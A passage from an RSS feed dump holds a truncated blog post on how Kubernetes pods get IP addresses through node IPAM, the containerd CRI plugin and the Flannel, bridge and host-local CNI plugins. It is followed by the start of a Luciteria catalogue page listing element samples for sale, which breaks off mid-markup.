<a href="https://kubernetes.io/docs/concepts/cluster-administration/networking/#the-kubernetes-network-model" target="_blank" rel="noopener">Kubernetes networking model</a> is that every pod should get its own IP address and that every pod in the cluster should be able to talk to it using this IP address. There are several network providers (flannel, calico, canal, etc.) that implement this networking model.</p><p>As I started working on Kubernetes, it wasn’t completely clear to me how every pod is assigned an IP address. I understood how various components worked independently, however, it wasn’t clear how these components fit together. For instance, I understood what CNI plugins were, however, I didn’t know how they were invoked. So, I wanted to write this post to share what I have learned about various networking components and how they are stitched together in a kubernetes cluster for every pod to receive an IP address.</p><p>There are various ways of setting up networking in kubernetes and various options for a container runtime. For this post, I will use
<a href="https://github.com/coreos/flannel" target="_blank" rel="noopener">Flannel</a> as the network provider and
<a href="https://github.com/containerd/containerd" target="_blank" rel="noopener">Containerd</a> as the container runtime. Also, I am going to assume that you know how container networking works and only share a very brief overview below for context.</p><h2 id="some-background-concepts">Some Background Concepts</h2><h3 id="container-networking-a-very-brief-overview">Container Networking: A Very Brief Overview</h3><p>There are some really good posts explaining how container networking works. For context, I will go over a very high level overview here with a single approach that involves linux bridge networking and packet encapsulation. I am skipping details here as container networking deserves a blog post of itself. Some of the posts that I have found to be very educational in this space are
<a href="#container-networking">linked in the references below</a>.</p><h4 id="containers-on-the-same-host">Containers on the same host</h4><p>One of the ways containers running on the same host can talk to each other via their IP addresses is through a linux bridge. In the kubernetes (and docker) world, a
<a href="https://man7.org/linux/man-pages/man4/veth.4.html" target="_blank" rel="noopener">veth (virtual ethernet)</a> device is created to achieve this. One end of this veth device is inserted into the container network namespace and the other end is connected to a
<a href="https://wiki.archlinux.org/index.php/Network_bridge" target="_blank" rel="noopener">linux bridge</a> on the host network. All containers on the same host have one end of this veth pair connected to the linux bridge and they can talk to each other using their IP addresses via the bridge. The linux bridge is also assigned an IP address and it acts as a gateway for egress traffic from pods destined to different nodes.
<img src="https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/bridge-networking.png" alt="bridge networking"></p><h4 id="containers-on-different-hosts">Containers on different hosts</h4><p>One of the ways containers running on different hosts can talk to each other via their IP addresses is by using packet encapsulation. Flannel supports this through
<a href="https://vincent.bernat.ch/en/blog/2017-vxlan-linux" target="_blank" rel="noopener">vxlan</a> which wraps the original packet inside a UDP packet and sends it to the destination.</p><p>In a kubernetes cluster, flannel creates a vxlan device and some route table entries on each of the nodes. Every packet that’s destined for a container on a different host goes through the vxlan device and is encapsulated in a UDP packet. On the destination, the encapsulated packet is retrieved and the packet is routed through to the destined pod.
<img src="https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/flannel-networking.png" alt="flannel networking"></p><p><em>NOTE: This is just one of the ways how networking between containers can be configured.</em></p><h3 id="what-is-cri">What Is CRI?</h3><p><a href="https://github.com/kubernetes/cri-api" target="_blank" rel="noopener">CRI (Container Runtime Interface)</a> is a plugin interface that allows kubelet to use different container runtimes. Various container runtimes implement the CRI API and this allows users to use the container runtime of their choice in their kubernetes installation.</p><h3 id="what-is-cni">What is CNI?</h3><p><a href="https://github.com/containernetworking/cni" target="_blank" rel="noopener">CNI project</a> includes a
<a href="https://github.com/containernetworking/cni/blob/master/SPEC.md" target="_blank" rel="noopener">spec</a> to provide a generic plugin-based networking solution for linux containers. It also consists of various
<a href="https://github.com/containernetworking/plugins" target="_blank" rel="noopener">plugins</a> which perform different functions in configuring the pod network. A CNI plugin is an executable that follows the CNI spec and we’ll discuss some plugins in the post below.</p><h2 id="assigning-subnets-to-nodes-for-pod-ip-addresses">Assigning Subnets To Nodes For Pod IP Addresses</h2><p>If all pods are required to have an IP address, it’s important to ensure that all pods across the entire cluster have a unique IP address. This is achieved by assigning each node a unique subnet from which pods are assigned IP addresses on that node.</p><h3 id="node-ipam-controller">Node IPAM Controller</h3><p>When <code>nodeipam</code> is passed as an option to the
<a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kube-controller-manager/" target="_blank" rel="noopener">kube-controller-manager’s</a> <code>--controllers</code> command line flag, it allocates each node a dedicated subnet (podCIDR) from the cluster CIDR (IP range for the cluster network). Since these podCIDRs are disjoint subnets, it allows assigning each pod a unique IP address.</p><p>A kubernetes node is assigned a podCIDR when the node first registers with the cluster. To change the podCIDR allocated to nodes in a cluster, nodes need to be de-registered and then re-registered with any configuration changes first applied to the kubernetes control plane. <code>podCIDR</code> for a node can be listed using the following command.</p><pre><code>$ kubectl get no &lt;nodeName&gt; -o json | jq '.spec.podCIDR'
10.244.0.0/24
</code></pre><h2 id="kubelet-container-runtime-and-cni-plugins---how-its-all-stitched-together">Kubelet, Container Runtime and CNI Plugins - how it’s all stitched together</h2><p>When a pod is scheduled on a node, a lot of things happen to start up a pod. In this section, I’ll only focus on the interactions that relate to configuring network for the pod.</p><p>Once a pod is scheduled on the node, the following interactions result in configuring the network and starting the application container.
<img src="https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/kubelet-cri-cni-flowchart.png" alt="kubelet-cri-cni-flowchart"></p><p>Ref:
<a href="https://github.com/containerd/cri/blob/v1.11.1/docs/architecture.md" target="_blank" rel="noopener">Containerd cri plugin architecture</a></p><h2 id="interactions-between-container-runtime-and-cni-plugins">Interactions between Container Runtime and CNI Plugins</h2><p>Every network provider has a CNI plugin which is invoked by the container runtime to configure network for a pod as it’s started. With containerd as the container runtime,
<a href="https://github.com/containerd/cri" target="_blank" rel="noopener">Containerd CRI plugin</a> invokes the CNI plugin. Every network provider also has an agent that’s installed on each of the kubernetes node to configure pod networking. When the network provider agent is installed, it either ships with the CNI config or it creates one on the node which is then used by the CRI plugin to figure out which CNI plugin to call.</p><p>The location for the CNI config file is configurable and the default value is <code>/etc/cni/net.d/&lt;config-file&gt;</code>. CNI plugins need to be shipped on every node by the cluster administrators. The location for CNI plugins is configurable as well and the default value is <code>/opt/cni/bin</code>.</p><p>In case of containerd as the container runtime, path for CNI configuration and CNI plugin binaries can be specified under <code>[plugins."io.containerd.grpc.v1.cri".cni]</code> section of the
<a href="https://github.com/containerd/cri/blob/master/docs/config.md" target="_blank" rel="noopener">containerd config</a>.</p><p>Since we are referring to Flannel as the network provider here, I’ll talk a little about how Flannel is set up. Flanneld is the Flannel daemon and is typically installed on a kubernetes cluster as a daemonset with <code>install-cni</code> as an
<a href="https://github.com/coreos/flannel/blob/master/Documentation/kube-flannel.yml#L172" target="_blank" rel="noopener">init container</a>. The <code>install-cni</code> container creates the
<a href="https://gist.github.com/ronaknnathani/957a56210bd4fbd8e11120273c6b4ede" target="_blank" rel="noopener">CNI configuration file</a> - <code>/etc/cni/net.d/10-flannel.conflist</code> - on each node. Flanneld creates a vxlan device, fetches networking metadata from the apiserver and watches for updates on pods. As pods are created, it distributes routes for all pods across the entire cluster and these routes allow pods to connect to each other via their IP addresses. For details on how flannel works, I recommend the
<a href="#how-flannel-works">linked references below</a>.</p><p>The interactions between Containerd CRI Plugin and CNI plugins can be visualized as follows:
<img src="https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/kubelet-cri-cni-interactions.png" alt="kubelet-cri-cni-interactions"></p><p>As described above, kubelet calls the Containerd CRI plugin in order to create a pod and Containerd CRI plugin calls the CNI plugin to configure network for the pod. The network provider CNI plugin calls other base CNI plugins to configure the network. The interactions between CNI plugins are described below.</p><h3 id="interactions-between-cni-plugins">Interactions Between CNI Plugins</h3><p>There are various CNI plugins that help configure networking between containers on a host. For this post, we will refer to 3 plugins.</p><h4 id="flannel-cni-plugin">Flannel CNI Plugin</h4><p>When using Flannel as the network provider, the Containerd CRI plugin invokes the
<a href="https://github.com/containernetworking/plugins/tree/master/plugins/meta/flannel" target="_blank" rel="noopener">Flannel CNI plugin</a> using the CNI configuration file - <code>/etc/cni/net.d/10-flannel.conflist</code>.</p><pre><code>$ cat /etc/cni/net.d/10-flannel.conflist
{
  "name": "cni0",
  "plugins": [
    {
      "type": "flannel",
      "delegate": {
		 "ipMasq": false,
        "hairpinMode": true,
        "isDefaultGateway": true
      }
    }
  ]
}
</code></pre><p>The Fannel CNI plugin works in conjunction with Flanneld. When Flanneld starts up, it fetches the podCIDR and other network related details from the apiserver and stores them in a file - <code>/run/flannel/subnet.env</code>.</p><pre><code>FLANNEL_NETWORK=10.244.0.0/16 
FLANNEL_SUBNET=10.244.0.1/24
FLANNEL_MTU=1450 
FLANNEL_IPMASQ=false
</code></pre><p>The Flannel CNI plugin uses the information in <code>/run/flannel/subnet.env</code> to configure and invoke the bridge CNI plugin.</p><h4 id="bridge-cni-plugin">Bridge CNI Plugin</h4><p>Flannel CNI plugin calls the Bridge CNI plugin with the following configuration:</p><pre><code>{
  "name": "cni0",
  "type": "bridge",
  "mtu": 1450,
  "ipMasq": false,
  "isGateway": true,
  "ipam": {
    "type": "host-local",
    "subnet": "10.244.0.0/24"
  }
}
</code></pre><p>When
<a href="https://github.com/containernetworking/plugins/tree/master/plugins/main/bridge" target="_blank" rel="noopener">Bridge CNI plugin</a> is invoked for the first time, it creates a linux bridge with the <code>"name": "cni0"</code> specified in the config file. For every pod, it then creates a veth pair - one end of the pair is in the container’s network namespace and the other end is connected to the linux bridge on the host network. With Bridge CNI plugin, all containers on a host are connected to the linux bridge on the host network.</p><p>After configuring the veth pair, Bridge plugin invokes the host-local IPAM CNI plugin. Which IPAM plugin to use can be configured in the CNI config CRI plugin uses to call the flannel CNI plugin.</p><h4 id="host-local-ipam-cni-plugins">Host-local IPAM CNI plugins</h4><p>The Bridge CNI plugin calls the
<a href="https://github.com/containernetworking/plugins/tree/master/plugins/ipam/host-local" target="_blank" rel="noopener">host-local IPAM CNI plugin</a> with the following configuration:</p><pre><code>{
  "name": "cni0",
  "ipam": {
    "type": "host-local",
    "subnet": "10.244.0.0/24",
    "dataDir": "/var/lib/cni/networks"
  }
}
</code></pre><p>Host-local IPAM (IP Address Management) plugin returns an IP address for the container from the <code>subnet</code> and stores the allocated IP locally on the host under the directory specified under <code>dataDir</code> - <code>/var/lib/cni/networks/&lt;network-name=cni0&gt;/&lt;ip&gt;</code>. <code>/var/lib/cni/networks/&lt;network-name=cni0&gt;/&lt;ip&gt;</code> file contains the container ID to which the IP is assigned.</p><p>When invoked, the host-local IPAM plugin returns the following payload</p><pre><code>{
  "ip4": {
    "ip": "10.244.4.2",
    "gateway": "10.244.4.3"
  },
  "dns": {}
}
</code></pre><h2 id="summary">Summary</h2><p>Kube-controller-manager assigns a podCIDR to each node. Pods on a node are …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/">https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/</a></em></p>]]>
            </description>
            <link>https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246373</guid>
            <pubDate>Sat, 22 Aug 2020 19:01:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Luciteria: Every Element for Sale]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24246299">thread link</a>) | @apsec112
<br/>
August 22, 2020 | https://luciteria.com/elements-for-sale | <a href="https://web.archive.org/web/*/https://luciteria.com/elements-for-sale">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="pageWrapper" role="main">
				<section id="page" data-content-field="main-content">
					<div id="productList">

  

    <a href="https://luciteria.com/elements-for-sale/one-of-each-set" id="thumb-one-of-each-set" data-item-id="5b7b159f4fa51a76f36fa852">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1548980846755-RFDFCOF5SA1EEUGAZBQR/ke17ZwdGBToddI8pDm48kGWgfW0tMFKbZRxIbs8OCyd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0hZPx-jNbZA_TaS-5l2nNKGTwh1z4STJhqljBSSWbZ9AUC8Xe8z_NioP-SEWAkobEg/7194_11.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1548980846755-RFDFCOF5SA1EEUGAZBQR/ke17ZwdGBToddI8pDm48kGWgfW0tMFKbZRxIbs8OCyd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0hZPx-jNbZA_TaS-5l2nNKGTwh1z4STJhqljBSSWbZ9AUC8Xe8z_NioP-SEWAkobEg/7194_11.JPG" data-image-dimensions="2500x1763" data-image-focal-point="0.5,0.5" alt="7194_11.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>"One of Each" Set</p>
            


<p>
from <span>0.65</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/aluminum-metal-99996" id="thumb-aluminum-metal-99996" data-item-id="58a4df9dd2b857e2ecb5a3ce">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1487200161315-9DNZPYO7IDJCKNUX9XKN/ke17ZwdGBToddI8pDm48kBxlfQLbKTV43oyczc2Yqjh7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0gycmlYrUNOm5FlGNDjMZJiuCDCSVSkc3jXwy1z4ECcd94kd_LE8nnQWnioeCVCPkw/Aluminum.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1487200161315-9DNZPYO7IDJCKNUX9XKN/ke17ZwdGBToddI8pDm48kBxlfQLbKTV43oyczc2Yqjh7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0gycmlYrUNOm5FlGNDjMZJiuCDCSVSkc3jXwy1z4ECcd94kd_LE8nnQWnioeCVCPkw/Aluminum.JPG" data-image-dimensions="2500x1070" data-image-focal-point="0.5,0.5" alt="Aluminum.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Aluminum metal 99.99% pellets</p>
            


<p>
from <span>2.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-antimony-metal" id="thumb-buy-antimony-metal" data-item-id="588c5d11e3df287fa729fec0">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529952227263-6VA6Z56JR3HI8E7BFP1E/ke17ZwdGBToddI8pDm48kMFiMyT1nneRMhnmfuSfpxZ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mlM0or4nqX7jrn5yWu0hA1QXedaIFqnAbw_tQShHbKg4-O_KAc44ak5jGzrnn7f3A/Antimony+%283%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529952227263-6VA6Z56JR3HI8E7BFP1E/ke17ZwdGBToddI8pDm48kMFiMyT1nneRMhnmfuSfpxZ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mlM0or4nqX7jrn5yWu0hA1QXedaIFqnAbw_tQShHbKg4-O_KAc44ak5jGzrnn7f3A/Antimony+%283%29.JPG" data-image-dimensions="2500x2000" data-image-focal-point="0.5,0.5" alt="Antimony (3).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Antimony 99.99999% monocrystalline</p>
            


<p>
from <span>3.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/argon-gas-9999" id="thumb-argon-gas-9999" data-item-id="5ae12703562fa74bb6cec9ad">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524705179057-7JNO31IWN16BINQBAKK3/ke17ZwdGBToddI8pDm48kKAwwdAfKsTlKsCcElEApLR7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UegTYNQkRo-Jk4EWsyBNhwKrKLo5CceA1-Tdpfgyxoog5ck0MD3_q0rY3jFJjjoLbQ/Argon.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524705179057-7JNO31IWN16BINQBAKK3/ke17ZwdGBToddI8pDm48kKAwwdAfKsTlKsCcElEApLR7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UegTYNQkRo-Jk4EWsyBNhwKrKLo5CceA1-Tdpfgyxoog5ck0MD3_q0rY3jFJjjoLbQ/Argon.JPG" data-image-dimensions="2000x1333" data-image-focal-point="0.5,0.5" alt="Argon.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Argon gas 99.99%</p>
            


<p><span>7.00</span>
</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-arsenic" id="thumb-buy-arsenic" data-item-id="589124f69f7456770050f354">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1485907527648-ALDKO89RWL1HWW3UFZA6/ke17ZwdGBToddI8pDm48kG3yrEFGM-8oiowH6yfN7EF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmLKoxsx6wp33kn5fgRqCuBbzKyfX9-yvTvpSf15UHRLDuOgPN7jP-glW7qQgzukTi/Arsenic+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1485907527648-ALDKO89RWL1HWW3UFZA6/ke17ZwdGBToddI8pDm48kG3yrEFGM-8oiowH6yfN7EF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmLKoxsx6wp33kn5fgRqCuBbzKyfX9-yvTvpSf15UHRLDuOgPN7jP-glW7qQgzukTi/Arsenic+%282%29.JPG" data-image-dimensions="1174x1100" data-image-focal-point="0.5,0.5" alt="Arsenic (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Arsenic 99.9999% crystalline</p>
            


<p>
from <span>3.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-barium-metal" id="thumb-buy-barium-metal" data-item-id="589acdf7e58c626130b7a69c">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529952402139-8N7RCZ4ZVIPWR49DT9PM/ke17ZwdGBToddI8pDm48kNAMBfY-Kq0rPdTnzim1Ax57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmo3_5ncHsS_KC884-Z46vJaxYmo17Qky-UQgh6srENT5ZnmEsMC_f2Sst0LuVE4Lu/Barium+%286%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529952402139-8N7RCZ4ZVIPWR49DT9PM/ke17ZwdGBToddI8pDm48kNAMBfY-Kq0rPdTnzim1Ax57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmo3_5ncHsS_KC884-Z46vJaxYmo17Qky-UQgh6srENT5ZnmEsMC_f2Sst0LuVE4Lu/Barium+%286%29.JPG" data-image-dimensions="1484x1218" data-image-focal-point="0.5,0.5" alt="Barium (6).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Barium metal 99.8% </p>
            


<p>
from <span>7.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-beryllium" id="thumb-buy-beryllium" data-item-id="589c3d53bebafbeb4a64153b">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1486634344694-JHZH84YUQBLTTTODWFBM/ke17ZwdGBToddI8pDm48kLoUGKMSccw5uysQPMoQwHgUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dm_vNpQTboikm7ZTXYUvy8wZe1M8dcE2XKuY_mY5QyEe7zs2yPjc1ECvpa5Zm_kMqw/Beryllium.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1486634344694-JHZH84YUQBLTTTODWFBM/ke17ZwdGBToddI8pDm48kLoUGKMSccw5uysQPMoQwHgUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dm_vNpQTboikm7ZTXYUvy8wZe1M8dcE2XKuY_mY5QyEe7zs2yPjc1ECvpa5Zm_kMqw/Beryllium.JPG" data-image-dimensions="1988x960" data-image-focal-point="0.5,0.5" alt="Beryllium.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Beryllium metal 99.95%</p>
            


<p>
from <span>5.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-bismuth" id="thumb-buy-bismuth" data-item-id="58bcbdd7b3db2b0887a8a785">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1488764379304-SO69WPZR2HM1DQU242C7/ke17ZwdGBToddI8pDm48kI-mlJ_i6Pl-vfN2yTEGjA97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0lCvyAd1-5UQFnp8aARaJsW2ahYd8gI-WtqsqN2EINo70MG8YQoPE5xb9BNJrc-fUw/Bismuth+%284%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1488764379304-SO69WPZR2HM1DQU242C7/ke17ZwdGBToddI8pDm48kI-mlJ_i6Pl-vfN2yTEGjA97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0lCvyAd1-5UQFnp8aARaJsW2ahYd8gI-WtqsqN2EINo70MG8YQoPE5xb9BNJrc-fUw/Bismuth+%284%29.JPG" data-image-dimensions="2500x1469" data-image-focal-point="0.5,0.5" alt="Bismuth (4).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Bismuth metal 99.99% </p>
            


<p>
from <span>2.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-bismuth-crystals" id="thumb-buy-bismuth-crystals" data-item-id="586dff402e69cfbb96a37ebc">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483603828576-L9YG1HNXLJE0CDVES59E/ke17ZwdGBToddI8pDm48kCrJqFDVxcX4AgNF9xZtzYIUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcvhgQ0asO6q_4TzJ1z4QAhZrOSgzt3v_Dk3MI-LokCuwiE8p5c8yaRDeknVywA8AW/Bismuth.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483603828576-L9YG1HNXLJE0CDVES59E/ke17ZwdGBToddI8pDm48kCrJqFDVxcX4AgNF9xZtzYIUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcvhgQ0asO6q_4TzJ1z4QAhZrOSgzt3v_Dk3MI-LokCuwiE8p5c8yaRDeknVywA8AW/Bismuth.JPG" data-image-dimensions="1302x945" data-image-focal-point="0.5,0.5" alt="Bismuth.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Bismuth crystal 99.99% crystal</p>
            


<p>
from <span>10.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-boron-element" id="thumb-buy-boron-element" data-item-id="586e25c246c3c40a1c5ea0ee">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1486636409257-52V3PE07EN58DRJIDBW8/ke17ZwdGBToddI8pDm48kFL73TKFqPcyfgnTvHeaK9wUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dstqe8ukXAsj5L648pBMyn5V_FBX_ZxZTSX8XLoMduLTZtJ3qR9G2BYeA0wOAaeYNg/Boron+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1486636409257-52V3PE07EN58DRJIDBW8/ke17ZwdGBToddI8pDm48kFL73TKFqPcyfgnTvHeaK9wUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dstqe8ukXAsj5L648pBMyn5V_FBX_ZxZTSX8XLoMduLTZtJ3qR9G2BYeA0wOAaeYNg/Boron+%282%29.JPG" data-image-dimensions="2031x838" data-image-focal-point="0.5,0.5" alt="Boron (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Boron 'metal' 99.99% crystal</p>
            


<p>
from <span>5.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/cadmium-metal-99999-sticks" id="thumb-cadmium-metal-99999-sticks" data-item-id="58dcf4e05016e1b665d2865b">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1490875629270-Y3QRSMHAJ45SLA7EX7VF/ke17ZwdGBToddI8pDm48kL81cMPWGBhW5tdlkl-a3T17gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0oGwQPSn8VqSSM4mc7rOnoi-MnCJ_JoRqqlrKTHvhbYUfuZCBOm-tyD0seWeFd5Kig/Cadmium+%283%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1490875629270-Y3QRSMHAJ45SLA7EX7VF/ke17ZwdGBToddI8pDm48kL81cMPWGBhW5tdlkl-a3T17gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0oGwQPSn8VqSSM4mc7rOnoi-MnCJ_JoRqqlrKTHvhbYUfuZCBOm-tyD0seWeFd5Kig/Cadmium+%283%29.JPG" data-image-dimensions="2500x1753" data-image-focal-point="0.5,0.5" alt="Cadmium (3).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Cadmium metal 99.999%</p>
            


<p>
from <span>2.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-calcium" id="thumb-buy-calcium" data-item-id="586e0503ff7c50a814aa7702">
      <div>

        <div>
          <div>
